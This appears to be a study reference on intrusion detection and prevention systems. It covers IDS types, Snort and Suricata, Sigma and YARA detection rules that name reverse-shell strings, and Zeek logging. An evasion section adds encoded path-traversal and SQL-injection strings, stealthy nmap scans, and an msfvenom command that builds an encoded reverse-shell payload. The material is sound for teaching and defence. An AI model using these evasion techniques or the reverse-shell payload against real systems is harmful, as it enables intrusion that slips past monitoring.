# IDS/IPS — Intrusion Detection & Prevention Systems

## Types

| Type | Detection Method | Pros | Cons |
|------|-----------------|------|------|
| **Signature-based** | Match known attack patterns | Low FP, fast | Misses zero-days |
| **Anomaly-based** | Deviation from baseline | Detects novel attacks | High FP rate |
| **Stateful protocol** | Track protocol state machines | Catches protocol abuse | Complex, resource-heavy |
| **Heuristic/behavioral** | Rule-based logic + ML | Adaptive | Requires tuning |

## Architecture

### Network IDS/IPS (NIDS/NIPS)
```
                    ┌─────────────┐
   Internet ───────│  Firewall   │
                    └──────┬──────┘
                           │
                    ┌──────┴──────┐
                    │   IDS/IPS   │──── SPAN/TAP port (mirror traffic)
                    └──────┬──────┘
                           │
                    ┌──────┴──────┐
                    │  Internal   │
                    │  Network    │
                    └─────────────┘

IDS mode: passive (monitor + alert)
IPS mode: inline (monitor + block)
```

### Host IDS/IPS (HIDS/HIPS)
- Runs on individual hosts
- Monitors file integrity, system calls, logs
- Examples: OSSEC, Wazuh, Sysmon, CrowdStrike Falcon

## Popular Tools

| Tool | Type | Notes |
|------|------|-------|
| Snort | NIDS/NIPS | Open-source, signature-based, by Cisco |
| Suricata | NIDS/NIPS | Multi-threaded, supports Snort rules + lua |
| Zeek (Bro) | NSM | Network security monitor, protocol analysis |
| OSSEC/Wazuh | HIDS | Log analysis, file integrity, rootkit detection |
| Fail2ban | HIPS | Bans IPs based on log patterns |

## Snort Rule Syntax
```
action protocol src_ip src_port -> dst_ip dst_port (options)

# Examples:
# Alert on any ICMP ping
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

# Detect SQL injection attempt
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
  msg:"SQL Injection Attempt";
  flow:to_server,established;
  content:"UNION"; nocase;
  content:"SELECT"; nocase;
  sid:1000002; rev:1;
)

# Detect reverse shell (bash -i)
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Possible Reverse Shell";
  flow:established;
  content:"/bin/bash"; nocase;
  content:"-i"; distance:0; within:5;
  sid:1000003; rev:1;
)

# Detect DNS tunneling (long subdomain)
alert udp any any -> any 53 (
  msg:"Possible DNS Tunneling";
  content:"|00 01|"; offset:2; depth:2;  # Standard query
  byte_test:1,>,50,12;  # Query name > 50 bytes
  sid:1000004; rev:1;
)
```

## Suricata vs Snort

| Feature | Snort 3 | Suricata |
|---------|---------|----------|
| Multi-threading | Yes (recent) | Native |
| Protocol parsing | Yes | Extensive (HTTP, TLS, DNS, SMB) |
| File extraction | Yes | Yes |
| Lua scripting | Yes | Yes |
| EVE JSON logging | No | Yes (excellent for SIEM) |
| Hardware offload | Limited | AF_PACKET, DPDK |
| Rule compatibility | Snort rules | Snort + Suricata rules |

## IDS/IPS Evasion Techniques

### 1. Fragmentation
```bash
# Fragment packets to evade signature matching
nmap -f target              # Fragment probe packets
fragroute -f frag.conf target  # Advanced fragmentation

# IDS must reassemble fragments to inspect — many fail at edge cases
# Overlapping fragments, tiny fragments, out-of-order
```

### 2. Encoding/Obfuscation
```bash
# URL encoding to bypass web IDS
# /etc/passwd → %2Fetc%2Fpasswd
# UNION SELECT → %55NION %53ELECT

# Unicode encoding
# ../../../etc/passwd → ..%c0%af..%c0%af..%c0%afetc/passwd

# Case manipulation (if IDS is case-sensitive)
# UNION → UnIoN, SeLeCt
```

### 3. Protocol-Level Evasion
```bash
# TCP segmentation — split payload across segments
# Many IDS don't properly reassemble TCP streams

# HTTP chunked encoding
# Transfer-Encoding: chunked
# 5\r\n
# UNION\r\n
# 7\r\n
#  SELECT\r\n

# HTTP/2 multiplexing — harder for IDS to track
```

### 4. Timing-Based Evasion
```bash
# Slow scan to avoid rate-based detection
nmap -T0 target     # Paranoid timing (5 min between probes)
nmap -T1 target     # Sneaky timing (15 sec between probes)

# Spread attack over days/weeks
# Randomize source ports and intervals
```

### 5. Encrypted Channels
```bash
# TLS encryption makes content invisible to NIDS
# Solutions: TLS interception (MITM proxy), JA3/JA4 fingerprinting

# DNS-over-HTTPS tunneling — bypasses most DNS-based IDS
# Tor/VPN — encrypted transport evades content inspection
```

### 6. Polymorphic Payloads
```bash
# Msfvenom encoders
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f elf > shell.elf

# Custom shellcode with NOP sleds and variable encoding
# Each execution looks different to signature-based IDS
```

## Detection Engineering

### Sigma Rules (Vendor-Agnostic Detection)
```yaml
title: Suspicious PowerShell Download Cradle
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains|all:
      - 'powershell'
      - 'downloadstring'
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059.001
```

### YARA Rules (File/Memory Pattern Matching)
```
rule Suspicious_Reverse_Shell {
    meta:
        description = "Detects common reverse shell patterns"
        author = "Security Team"
    strings:
        $s1 = "/bin/sh -i" ascii
        $s2 = "/bin/bash -i" ascii
        $s3 = "socket.socket" ascii
        $s4 = "subprocess.call" ascii
        $s5 = "os.dup2" ascii
    condition:
        2 of them
}
```

## Zeek (Network Security Monitor)

Zeek doesn't just alert — it generates rich protocol logs:

```bash
# Start Zeek on interface
sudo zeek -i eth0

# Output logs:
# conn.log    — All connections (5-tuple, duration, bytes)
# dns.log     — All DNS queries/responses
# http.log    — HTTP requests with headers, URIs
# ssl.log     — TLS handshakes, JA3 hashes, certificates
# files.log   — File transfers with hashes
# notice.log  — Alerts and anomalies

# Example: Find all DNS queries to suspicious TLDs
cat dns.log | zeek-cut query | grep -E '\.(xyz|top|tk|ml)$'

# Example: Find large data transfers
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes | \
  awk '$3 > 1000000 || $4 > 1000000'
```
